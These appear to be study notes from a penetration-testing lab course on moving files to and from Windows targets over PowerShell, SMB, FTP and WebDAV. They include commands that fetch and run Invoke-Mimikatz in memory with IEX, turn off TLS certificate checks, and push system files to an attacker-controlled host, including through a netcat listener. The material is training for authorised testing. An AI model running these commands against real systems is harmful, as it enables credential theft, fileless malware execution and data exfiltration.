The term `fileless` suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. The file is not "present" on the system but runs in memory.

## PowerShell Base64 Encode & Decode

Depending on the file size we want to transfer, we can use different methods that do not require network communication.

#### Pwnbox Check SSH Key MD5 Hash
`tylapcheong@htb[/htb]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278  id_rsa`

#### Pwnbox Encode SSH Key to Base64
`tylapcheong@htb[/htb]$ cat id_rsa |base64 -w 0;echo 

We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

`PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String(""))`

Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.

#### Confirming the MD5 Hashes Match
`PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5


## PowerShell Web Downloads

Most companies allow `HTTP` and `HTTPS` outbound traffic through the firewall to allow employee productivity.

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

#### PowerShell DownloadFile Method

We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.

#### File Download
`PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') 

`PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1') 

`PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') 

`PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')`

#### PowerShell DownloadString - Fileless Method

As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

`PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`

`IEX` also accepts pipeline input.
`PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`


#### PowerShell Invoke-WebRequest

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

`PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`

#### Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

This can be bypassed using the parameter `-UseBasicParsing`.

`PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

`PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

#### Create the SMB Server
`tylapcheong@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare`

To download a file from the SMB server to the current working directory, we can use the following command:

#### Copy a File from the SMB Server
`C:\htb> copy \\192.168.220.133\share\nc.exe`



New versions of Windows block unauthenticated guest access, as we can see in the following command:
`C:\htb> copy \\192.168.220.133\share\nc.exe`
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
#### Create the SMB Server with a Username and Password
`tylapcheong@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

#### Mount the SMB Server with Username and Password
`C:\htb> net use n: \\192.168.220.133\share /user:test test`

## FTP Downloads

Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.

We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:
#### Installing the FTP Server Python3 Module - pyftpdlib
`tylapcheong@htb[/htb]$ sudo pip3 install pyftpdlib`

Then we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

#### Setting up a Python3 FTP Server
`tylapcheong@htb[/htb]$ sudo python3 -m pyftpdlib --port 21`


After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.
#### Transferring Files from an FTP Server Using PowerShell
`PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
#### Create a Command File for the FTP Client and Download the Target File
`C:\htb> echo open 192.168.49.128 > ftpcommand.txt C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo GET file.txt >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 
ftp> open 192.168.49.128 Log in with USER and PASS first. 
ftp> USER anonymous 
ftp> GET file.txt 
ftp> bye 
C:\htb>more file.txt This is a test file`

## Upload Operations
There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for uploads. Let's see how we can accomplish uploading files in various ways.

## PowerShell Base64 Encode & Decode

We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.

#### Encode File Using PowerShell
`PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`

`PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`

We copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.

#### Decode Base64 String in Linux
`tylapcheong@htb[/htb]$ echo {encodedString} | base64 -d > hosts`

`tylapcheong@htb[/htb]$ md5sum hosts`

## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function.
#### Installing a Configured WebServer with Upload
`tylapcheong@htb[/htb]$ pip3 install uploadserver`

`tylapcheong@htb[/htb]$ python3 -m uploadserver`

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.

#### PowerShell Script to Upload a File to Python Upload Server
`PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

`PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`

We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

`tylapcheong@htb[/htb]$ nc -lvnp 8000

POST / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682 Content-Type: application/x-www-form-urlencoded Host: 192.168.49.128:8000 Content-Length: 1820 Connection: Keep-Alive

{base64 String}
`

`tylapcheong@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts`

## SMB Uploads

We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

#### Installing WebDav Python modules

`tylapcheong@htb[/htb]$ sudo pip3 install wsgidav cheroot`

#### Using the WebDav Python module
`tylapcheong@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.
`C:\htb> dir \\192.168.49.128\DavWWWRoot`

**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

#### Uploading Files using SMB
`C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`

**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

## FTP Uploads

Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.

`tylapcheong@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write`

Now let's use the PowerShell upload function to upload a file to our FTP Server.

#### PowerShell Upload File
`PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

#### Create a Command File for the FTP Client to Upload a File
`C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
`C:\htb> echo USER anonymous >> ftpcommand.txt `
`C:\htb> echo binary >> ftpcommand.txt `
`C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt `
`C:\htb> echo bye >> ftpcommand.txt `
`C:\htb> ftp -v -n -s:ftpcommand.txt `
`ftp> open 192.168.49.128 `

Log in with USER and PASS first. 
`ftp> USER anonymous `
`ftp> PUT c:\windows\system32\drivers\etc\hosts `
`ftp> bye`